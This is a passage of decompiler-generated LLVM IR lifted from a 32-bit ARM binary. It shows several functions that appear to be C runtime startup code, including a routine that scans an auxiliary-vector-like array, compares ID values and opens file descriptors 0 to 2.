  %v2_16d48 = icmp eq i32 %arg2, 0
  br i1 %v2_16d48, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16d44
  %v2_16d54 = add i32 %tmp, 4
  %v3_16d54 = inttoptr i32 %v2_16d54 to i32*
  %v4_16d54 = load i32, i32* %v3_16d54, align 4
  store i32 %v4_16d54, i32* %r0.global-to-local, align 4
  %v3_16d58 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16d44, %bb
  %.02 = phi i32 [ %v3_16d58, %bb ], [ undef, %dec_label_pc_16d44 ]
  %v2_16d60 = xor i1 %v2_16d48, true
  call void @__pseudo_cond_branch(i1 %v2_16d60, i32 %.02)
  %v1_16d6c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16d6c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_16d70() local_unnamed_addr {
dec_label_pc_16d94.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16d70 = load i32, i32* @r4, align 4
  store i32 %v3_16d70, i32* %stack_var_-16, align 4
  store i32 180232, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d94.dec_label_pc_16d94_crit_edge, %dec_label_pc_16d94.lr.ph
  %v1_16d94 = phi i32 [ %v1_16da0, %dec_label_pc_16d94.dec_label_pc_16d94_crit_edge ], [ 0, %dec_label_pc_16d94.lr.ph ]
  %v0_16d94 = phi i32 [ %v0_16d94.pre, %dec_label_pc_16d94.dec_label_pc_16d94_crit_edge ], [ 180232, %dec_label_pc_16d94.lr.ph ]
  %v4_16d94 = mul i32 %v1_16d94, 4
  %v5_16d94 = add i32 %v4_16d94, %v0_16d94
  %v6_16d94 = inttoptr i32 %v5_16d94 to i32*
  %v7_16d94 = load i32, i32* %v6_16d94, align 4
  call void @__pseudo_branch(i32 %v7_16d94)
  %v0_16da0 = load i32, i32* %r4.global-to-local, align 4
  %v1_16da0 = add i32 %v0_16da0, -1
  store i32 %v1_16da0, i32* %r4.global-to-local, align 4
  %v2_16da0 = icmp eq i32 %v0_16da0, 0
  br i1 %v2_16da0, label %dec_label_pc_16da8, label %dec_label_pc_16d94.dec_label_pc_16d94_crit_edge

dec_label_pc_16d94.dec_label_pc_16d94_crit_edge:  ; preds = %dec_label_pc_16d94
  %v0_16d94.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16d94

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d94
  %v4_16dac = load i32, i32* @global_var_32ab8.897, align 4
  %v2_16db0 = icmp eq i32 %v4_16dac, 0
  br i1 %v2_16db0, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_16da8
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16da8, %bb
  %v2_16db8 = xor i1 %v2_16db0, true
  call void @__pseudo_cond_branch(i1 %v2_16db8, i32 %v4_16dac)
  %v4_16dc0 = load i32, i32* @global_var_32abc.899, align 4
  %v2_16dc4 = icmp eq i32 %v4_16dc0, 0
  br i1 %v2_16dc4, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_16dcc = xor i1 %v2_16dc4, true
  call void @__pseudo_cond_branch(i1 %v2_16dcc, i32 %v4_16dc0)
  %v2_16dd0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16dd0, i32* %r4.global-to-local, align 4
  %v1_16dd4 = load i32, i32* @r0, align 4
  ret i32 %v1_16dd4

; uselistorder directives
  uselistorder i32 %v1_16da0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_16dec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16dec:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_16e00 = call i32 @function_128a0(i32 %arg1, i32 1)
  %v3_16e08 = icmp eq i32 %v2_16e00, -1
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_15210.901 to i32), i32 93716), i32* @r3, align 4
  br i1 %v3_16e08, label %dec_label_pc_16e14, label %dec_label_pc_16e2c

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16dec
  %v0_16e18 = load i32, i32* %r5.global-to-local, align 4
  %v3_16e20 = call i32 @function_125b4(i32 ptrtoint ([10 x i8]* @global_var_2392c.903 to i32), i32 %v0_16e18)
  %v1_16e24 = load i32, i32* %r4.global-to-local, align 4
  %v1_16e28 = icmp ne i32 %v3_16e20, %v1_16e24
  call void @__pseudo_cond_branch(i1 %v1_16e28, i32 ptrtoint (i32* @global_var_15acc.904 to i32))
  br label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16dec, %dec_label_pc_16e14
  %v1_16e34 = phi i32 [ %v2_16e00, %dec_label_pc_16dec ], [ %v3_16e20, %dec_label_pc_16e14 ]
  ret i32 %v1_16e34

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_16e2c, { 1, 0 }
}

define i32 @function_16e40(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e40:
  %r4.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_151d0.906 to i32), i32 93780), i32* %r4.global-to-local, align 4
  %v4_16e50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_151d0.906 to i32), i32 93880) to i32*), align 4
  %v1_16e54 = inttoptr i32 %v4_16e50 to i32*
  %v2_16e54 = load i32, i32* %v1_16e54, align 4
  %v2_16e58 = icmp eq i32 %v2_16e54, 0
  br i1 %v2_16e58, label %dec_label_pc_16e60, label %dec_label_pc_16e94

dec_label_pc_16e60:                               ; preds = %dec_label_pc_16e40
  %v4_16e64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_151d0.906 to i32), i32 93836) to i32*), align 4
  %v2_16e6c = icmp eq i32 %v4_16e64, 0
  store i32 4096, i32* %v1_16e54, align 4
  br i1 %v2_16e6c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_16e60
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_16e60, %bb
  %v2_16e78 = xor i1 %v2_16e6c, true
  call void @__pseudo_cond_branch(i1 %v2_16e78, i32 %v4_16e64)
  %v0_16e80 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e88 = icmp eq i32 %v0_16e80, 103420
  br i1 %v2_16e88, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_16e90 = xor i1 %v2_16e88, true
  call void @__pseudo_cond_branch(i1 %v2_16e90, i32 ptrtoint (i32* @global_var_12c28.910 to i32))
  br label %dec_label_pc_16e94

dec_label_pc_16e94:                               ; preds = %dec_label_pc_16e40, %bb6
  %v1_16e98 = load i32, i32* @r0, align 4
  ret i32 %v1_16e98

; uselistorder directives
  uselistorder i1 %v2_16e88, { 1, 0 }
  uselistorder label %dec_label_pc_16e94, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_16eac(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_16eac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_16eb4 = add i32 %tmp, 4
  store i32 %v1_16eb4, i32* %ip.global-to-local, align 4
  %v2_16eb8 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 180260, i32* @r6, align 4
  %v3_16ec4 = mul i32 %arg2, 4
  store i32 %v3_16ec4, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_16ecc = load i32, i32* inttoptr (i32 180280 to i32*), align 8
  store i32 %v4_16ecc, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_16ed4 = ptrtoint i32* %stack_var_-120 to i32
  %v4_16ed8 = load i32, i32* inttoptr (i32 180288 to i32*), align 64
  store i32 %v4_16ed8, i32* %r4.global-to-local, align 4
  %v2_16ee0 = add i32 %v1_16eb4, %v3_16ec4
  store i32 %v2_16ee0, i32* %ip.global-to-local, align 4
  %v9_16ee4 = icmp eq i32 %v2_16ee0, %v2_16eb8
  store i1 %v9_16ee4, i1* %cpsr_z.global-to-local, align 1
  %v2_16ee8 = inttoptr i32 %v4_16ecc to i32*
  store i32 %arg7, i32* %v2_16ee8, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 27288, i32* %r2.global-to-local, align 4
  %v0_16ef4 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_16ee4, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_16eac
  %v1_16ef8 = load i32, i32* @r7, align 4
  %v2_16ef8 = load i32, i32* %r5.global-to-local, align 4
  %v3_16ef8 = add i32 %v2_16ef8, %v1_16ef8
  store i32 %v3_16ef8, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_32abc.899, align 4
  %v0_16f00 = load i32, i32* %ip.global-to-local, align 4
  %v1_16f00 = load i32, i32* %r4.global-to-local, align 4
  %v2_16f00 = inttoptr i32 %v1_16f00 to i32*
  store i32 %v0_16f00, i32* %v2_16f00, align 4
  store i32 120, i32* @r2, align 4
  %v1_16f0c = load i32, i32* %r3.global-to-local, align 4
  %v2_16f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_16f0c = inttoptr i32 %v2_16f0c to i32*
  store i32 %v1_16f0c, i32* %v3_16f0c, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_16eac
  store i32 %arg6, i32* @global_var_32abc.899, align 4
  %v0_16f00.c = load i32, i32* %ip.global-to-local, align 4
  %v1_16f00.c = load i32, i32* %r4.global-to-local, align 4
  %v2_16f00.c = inttoptr i32 %v1_16f00.c to i32*
  store i32 %v0_16f00.c, i32* %v2_16f00.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_16f18 = bitcast i32* %stack_var_-120 to i8*
  %v3_16f18 = call i32 @function_13ed0(i8* %v2_16f18, i32 0)
  %v0_16f1c = load i32, i32* %r4.global-to-local, align 4
  %v1_16f1c = inttoptr i32 %v0_16f1c to i32*
  %storemerge.pre = load i32, i32* %v1_16f1c, align 4
  br label %dec_label_pc_16f28

dec_label_pc_16f28:                               ; preds = %dec_label_pc_16f28, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_16f28, %dec_label_pc_16f28 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_16f28 = inttoptr i32 %storemerge to i32*
  %v2_16f28 = load i32, i32* %v1_16f28, align 4
  store i32 %v2_16f28, i32* %r3.global-to-local, align 4
  %v4_16f28 = add i32 %storemerge, 4
  store i32 %v4_16f28, i32* %r2.global-to-local, align 4
  %v2_16f2c = icmp eq i32 %v2_16f28, 0
  store i32 %v4_16f28, i32* %r1.global-to-local, align 4
  br i1 %v2_16f2c, label %dec_label_pc_16f38, label %dec_label_pc_16f28

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f28
  store i32 %v4_16f28, i32* @r4, align 4
  store i32 %v2_16ed4, i32* @r5, align 4
  %v1_16f5c29 = inttoptr i32 %v4_16f28 to i32*
  %v2_16f5c30 = load i32, i32* %v1_16f5c29, align 4
  store i32 %v2_16f5c30, i32* %r3.global-to-local, align 4
  %v2_16f6032 = icmp eq i32 %v2_16f5c30, 0
  store i1 %v2_16f6032, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f6032, label %dec_label_pc_16f68, label %dec_label_pc_16f44

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16f38, %dec_label_pc_16f5c
  %v4_16f4c = phi i32 [ %v1_16f58, %dec_label_pc_16f5c ], [ %v4_16f28, %dec_label_pc_16f38 ]
  %v5_16f48 = phi i32 [ %v2_16f5c, %dec_label_pc_16f5c ], [ %v2_16f5c30, %dec_label_pc_16f38 ]
  %v2_16f44 = icmp ugt i32 %v5_16f48, 13
  %v7_16f44 = icmp eq i32 %v5_16f48, 14
  store i1 %v7_16f44, i1* %cpsr_z.global-to-local, align 1
  %v2_16f48 = xor i1 %v2_16f44, true
  %v3_16f48 = or i1 %v7_16f44, %v2_16f48
  br i1 %v3_16f48, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_16f44
  %v6_16f48 = and i32 %v5_16f48, 536870912
  %v7_16f48 = icmp ne i32 %v6_16f48, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_16f44, %bb58
  %v1_16f54 = phi i1 [ %v2_16f44, %dec_label_pc_16f44 ], [ %v7_16f48, %bb58 ]
  %v2_16f4c = xor i1 %v1_16f54, true
  %v3_16f4c = or i1 %v7_16f44, %v2_16f4c
  br i1 %v3_16f4c, label %bb60, label %dec_label_pc_16f5c

bb60:                                             ; preds = %bb59
  store i32 %v4_16f4c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_16f4c, i32 ptrtoint (i32* @global_var_14000.915 to i32))
  %v0_16f58 = load i32, i32* @r4, align 4
  %v1_16f58 = add i32 %v0_16f58, 8
  store i32 %v1_16f58, i32* @r4, align 4
  %v1_16f5c = inttoptr i32 %v1_16f58 to i32*
  %v2_16f5c = load i32, i32* %v1_16f5c, align 4
  store i32 %v2_16f5c, i32* %r3.global-to-local, align 4
  %v2_16f60 = icmp eq i32 %v2_16f5c, 0
  store i1 %v2_16f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f60, label %dec_label_pc_16f68, label %dec_label_pc_16f44

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16f38
  %v1_16f6c = call i32 @function_1aaf8(i32 %v2_16ed4)
  store i32 %v1_16f6c, i32* @r0, align 4
  %v1_16f70 = call i32 @function_16e40(i32 %v1_16f6c)
  store i32 %v1_16f70, i32* @r0, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_16f7c = load i32, i32* @r6, align 4
  %v2_16f7c = add i32 %v0_16f7c, 100
  %v3_16f7c = inttoptr i32 %v2_16f7c to i32*
  %v4_16f7c = load i32, i32* %v3_16f7c, align 4
  store i32 %v4_16f7c, i32* %r1.global-to-local, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_16f84 = icmp eq i32 %tmp53, 0
  store i1 %v2_16f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f84, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_16f68
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_16f68, %bb61
  %v0_16f90 = phi i32 [ %tmp53, %dec_label_pc_16f68 ], [ 4096, %bb61 ]
  %v3_16f8c = icmp eq i32 %tmp52, -1
  %v8_16f8c = icmp eq i32 %tmp52, -1
  store i1 %v8_16f8c, i1* %cpsr_z.global-to-local, align 1
  %v2_16f90 = inttoptr i32 %v4_16f7c to i32*
  store i32 %v0_16f90, i32* %v2_16f90, align 4
  br i1 %v3_16f8c, label %dec_label_pc_16f98, label %dec_label_pc_16fc0

dec_label_pc_16f98:                               ; preds = %bb62
  %v0_16f98 = call i32 @function_17494()
  store i32 %v0_16f98, i32* @r0, align 4
  store i32 %v0_16f98, i32* @r4, align 4
  %v0_16fa0 = call i32 @function_126cc()
  store i32 %v0_16fa0, i32* @r0, align 4
  %v0_16fa4 = load i32, i32* @r4, align 4
  %v9_16fa4 = icmp eq i32 %v0_16fa4, %v0_16fa0
  store i1 %v9_16fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16fa4, label %dec_label_pc_16fac, label %dec_label_pc_16fe8

dec_label_pc_16fac:                               ; preds = %dec_label_pc_16f98
  %v1_16fac = call i32 @function_17590(i32 %v0_16fa0)
  store i32 %v1_16fac, i32* @r0, align 4
  store i32 %v1_16fac, i32* @r4, align 4
  %v0_16fb4 = call i32 @function_17510()
  store i32 %v0_16fb4, i32* @r0, align 4
  %v0_16fb8 = load i32, i32* @r4, align 4
  %v9_16fb8 = icmp eq i32 %v0_16fb8, %v0_16fb4
  store i1 %v9_16fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16fb8, label %dec_label_pc_16fc0, label %dec_label_pc_16fe8

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_16fac, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_16f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16f8c, label %dec_label_pc_1700c, label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fc0
  store i32 %tmp51, i32* @r3, align 4
  %v9_16fd0 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_16fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16fd0, label %dec_label_pc_16fd8, label %dec_label_pc_16fe8

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fcc
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_16fe0 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_16fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16fe0, label %dec_label_pc_1700c, label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %dec_label_pc_16fcc, %dec_label_pc_16fac, %dec_label_pc_16f98, %dec_label_pc_16fd8
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_16ff0 = call i32 @function_16dec(i32 0, i32 32768)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_16ffc = call i32 @function_16dec(i32 1, i32 32770)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_17008 = call i32 @function_16dec(i32 2, i32 32770)
  store i32 %v2_17008, i32* @r0, align 4
  br label %dec_label_pc_1700c

dec_label_pc_1700c:                               ; preds = %dec_label_pc_16fd8, %dec_label_pc_16fc0, %dec_label_pc_16fe8
  %v0_1700c = load i32, i32* @r7, align 4
  %v1_1700c = inttoptr i32 %v0_1700c to i32*
  %v2_1700c = load i32, i32* %v1_1700c, align 4
  store i32 %v2_1700c, i32* %r2.global-to-local, align 4
  store i32 2100, i32* %r3.global-to-local, align 4
  %v1_17014 = load i32, i32* @r6, align 4
  %v3_17014 = add i32 %v1_17014, 2100
  %v4_17014 = inttoptr i32 %v3_17014 to i32*
  store i32 %v2_1700c, i32* %v4_17014, align 4
  %v0_17018 = load i32, i32* @r7, align 4
  %v1_17018 = inttoptr i32 %v0_17018 to i32*
  %v2_17018 = load i32, i32* %v1_17018, align 4
  store i32 %v2_17018, i32* @r4, align 4
  %v2_1701c = icmp eq i32 %v2_17018, 0
  store i1 %v2_1701c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1701c, label %dec_label_pc_170c0.lr.ph, label %dec_label_pc_17024

dec_label_pc_17024:                               ; preds = %dec_label_pc_1700c
  store i32 120, i32* %r3.global-to-local, align 4
  %v0_17028 = load i32, i32* @r6, align 4
  %v2_17028 = add i32 %v0_17028, 120
  %v3_17028 = inttoptr i32 %v2_17028 to i32*
  %v4_17028 = load i32, i32* %v3_17028, align 4
  store i32 %v4_17028, i32* %r3.global-to-local, align 4
  %v2_1702c = inttoptr i32 %v4_17028 to i32*
  store i32 %v2_17018, i32* %v2_1702c, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_17034 = load i32, i32* @r7, align 4
  %v1_17034 = inttoptr i32 %v0_17034 to i32*
  %v2_17034 = load i32, i32* %v1_17034, align 4
  %v4_17038 = call i32 @function_1a0d8(i32 %v2_17034, i32 47, i32 %v2_1700c, i32 %v4_17028)
  store i32 %v4_17038, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_17040 = icmp eq i32 %v4_17038, 0
  store i1 %v2_17040, i1* %cpsr_z.global-to-local, align 1
  %v0_17044 = load i32, i32* @r6, align 4
  %v2_17044 = add i32 %v0_17044, 64
  %v3_17044 = inttoptr i32 %v2_17044 to i32*
  %v4_17044 = load i32, i32* %v3_17044, align 4
  store i32 %v4_17044, i32* %r2.global-to-local, align 4
  br i1 %v2_17040, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_17024
  %v2_1704c47 = inttoptr i32 %v4_17044 to i32*
  store i32 0, i32* %v2_1704c47, align 4
  br label %dec_label_pc_170c0.lr.ph

bb63:                                             ; preds = %dec_label_pc_17024
  %v2_17048 = add i32 %v4_17038, 1
  store i32 %v2_17048, i32* %r3.global-to-local, align 4
  %v2_1704c = inttoptr i32 %v4_17044 to i32*
  store i32 %v4_17038, i32* %v2_1704c, align 4
  %v1_17050 = load i32, i32* %r3.global-to-local, align 4
  %v2_17050 = load i32, i32* %r2.global-to-local, align 4
  %v3_17050 = inttoptr i32 %v2_17050 to i32*
  store i32 %v1_17050, i32* %v3_17050, align 4
  br label %dec_label_pc_170c0.lr.ph

dec_label_pc_170c0.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_1700c
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_17068 = load i32, i32* @r6, align 4
  %v2_17068 = add i32 %v0_17068, -32
  store i32 %v2_17068, i32* %r8.global-to-local, align 4
  store i32 27284, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_32ab8.897, align 4
  %v2_17098 = icmp eq i32 %v0_16ef4, 0
  store i1 %v2_17098, i1* %cpsr_z.global-to-local, align 1
  %v2_170a0 = xor i1 %v2_17098, true
  call void @__pseudo_cond_branch(i1 %v2_170a0, i32 %v0_16ef4)
  store i32 -32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_170b4 = load i32, i32* @r6, align 4
  %v2_170b4 = add i32 %v0_170b4, -32
  store i32 %v2_170b4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_170c0

dec_label_pc_170c0:                               ; preds = %dec_label_pc_170c0.dec_label_pc_170c0_crit_edge, %dec_label_pc_170c0.lr.ph
  %v1_170c0 = phi i32 [ %v1_170cc, %dec_label_pc_170c0.dec_label_pc_170c0_crit_edge ], [ 0, %dec_label_pc_170c0.lr.ph ]
  %v0_170c0 = phi i32 [ %v0_170c0.pre, %dec_label_pc_170c0.dec_label_pc_170c0_crit_edge ], [ %v2_170b4, %dec_label_pc_170c0.lr.ph ]
  %v4_170c0 = mul i32 %v1_170c0, 4
  %v5_170c0 = add i32 %v4_170c0, %v0_170c0
  %v6_170c0 = inttoptr i32 %v5_170c0 to i32*
  %v7_170c0 = load i32, i32* %v6_170c0, align 4
  store i32 %v7_170c0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_170c0)
  %v0_170cc = load i32, i32* %r4.global-to-local, align 4
  %v1_170cc = add i32 %v0_170cc, 1
  store i32 %v1_170cc, i32* %r4.global-to-local, align 4
  %v1_170d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_170d0 = icmp ult i32 %v1_170cc, %v1_170d0
  %v9_170d0 = icmp eq i32 %v1_170cc, %v1_170d0
  store i1 %v9_170d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_170d0, label %dec_label_pc_170c0.dec_label_pc_170c0_crit_edge, label %dec_label_pc_170d8

dec_label_pc_170c0.dec_label_pc_170c0_crit_edge:  ; preds = %dec_label_pc_170c0
  %v0_170c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_170c0

dec_label_pc_170d8:                               ; preds = %dec_label_pc_170c0
  %v0_170dc.pre = load i32, i32* @r6, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_170dc = add i32 %v0_170dc.pre, 112
  %v3_170dc = inttoptr i32 %v2_170dc to i32*
  %v4_170dc = load i32, i32* %v3_170dc, align 4
  store i32 %v4_170dc, i32* %r2.global-to-local, align 4
  store i32 %v4_170dc, i32* %r3.global-to-local, align 4
  %v2_170e4 = icmp eq i32 %v4_170dc, 0
  store i1 %v2_170e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_170e4, label %dec_label_pc_170fc, label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170d8
  call void @__pseudo_branch(i32 %v4_170dc)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_170f8 = load i32, i32* @r0, align 4
  %v2_170f8 = inttoptr i32 %v1_170f8 to i32*
  store i32 0, i32* %v2_170f8, align 4
  %v0_17100.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170d8, %dec_label_pc_170ec
  %v0_17100 = phi i32 [ %v0_170dc.pre, %dec_label_pc_170d8 ], [ %v0_17100.pre, %dec_label_pc_170ec ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_17100 = add i32 %v0_17100, 84
  %v3_17100 = inttoptr i32 %v2_17100 to i32*
  %v4_17100 = load i32, i32* %v3_17100, align 4
  store i32 %v4_17100, i32* %r2.global-to-local, align 4
  store i32 %v4_17100, i32* %r3.global-to-local, align 4
  %v2_17108 = icmp eq i32 %v4_17100, 0
  store i1 %v2_17108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17108, label %dec_label_pc_17120, label %dec_label_pc_17110

dec_label_pc_17110:                               ; preds = %dec_label_pc_170fc
  call void @__pseudo_branch(i32 %v4_17100)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1711c = load i32, i32* @r0, align 4
  %v2_1711c = inttoptr i32 %v1_1711c to i32*
  store i32 0, i32* %v2_1711c, align 4
  %v0_17124.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17120

dec_label_pc_17120:                               ; preds = %dec_label_pc_170fc, %dec_label_pc_17110
  %v0_17124 = phi i32 [ %v0_17100, %dec_label_pc_170fc ], [ %v0_17124.pre, %dec_label_pc_17110 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_17124 = add i32 %v0_17124, 28
  %v3_17124 = inttoptr i32 %v2_17124 to i32*
  %v4_17124 = load i32, i32* %v3_17124, align 4
  store i32 %v4_17124, i32* %r3.global-to-local, align 4
  %v0_17128 = load i32, i32* @r7, align 4
  store i32 %v0_17128, i32* %r1.global-to-local, align 4
  %v1_1712c = inttoptr i32 %v4_17124 to i32*
  %v2_1712c = load i32, i32* %v1_1712c, align 4
  store i32 %v2_1712c, i32* %r2.global-to-local, align 4
  %v0_17130 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_1713c = call i32 @function_163f8(i32 %v0_17130)
  %v0_17140 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17140, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_17120
  %v1_17140 = load i32, i32* %r1.global-to-local, align 4
  %v2_17140 = load i32, i32* %ip.global-to-local, align 4
  %v8_17140 = ashr i32 %v2_17140, %v1_17140
  %v9_17140 = and i32 %v8_17140, %v1_17140
  store i32 %v9_17140, i32* %r5.global-to-local, align 4
  %v2_17144 = load i32, i32* %r4.global-to-local, align 4
  %v1_1714c = load i32, i32* %r8.global-to-local, align 4
  %v3_1714c = mul i32 %v1_1714c, %v0_16ef4
  %v4_17150 = and i32 %v3_1714c, %v2_17144
  %v2_17154 = load i32, i32* %r2.global-to-local, align 4
  %v3_17154 = and i32 %v4_17150, %v2_17154
  store i32 %v3_17154, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17120, %bb64
  %v4_17160 = phi i32 [ %v1_1713c, %dec_label_pc_17120 ], [ 0, %bb64 ]
  ret i32 %v4_17160

; uselistorder directives
  uselistorder i32 %v0_170dc.pre, { 1, 0 }
  uselistorder i32 %v1_170d0, { 1, 0 }
  uselistorder i32 %v1_170cc, { 3, 2, 1, 0 }
  uselistorder i32 %v4_17044, { 1, 0, 2 }
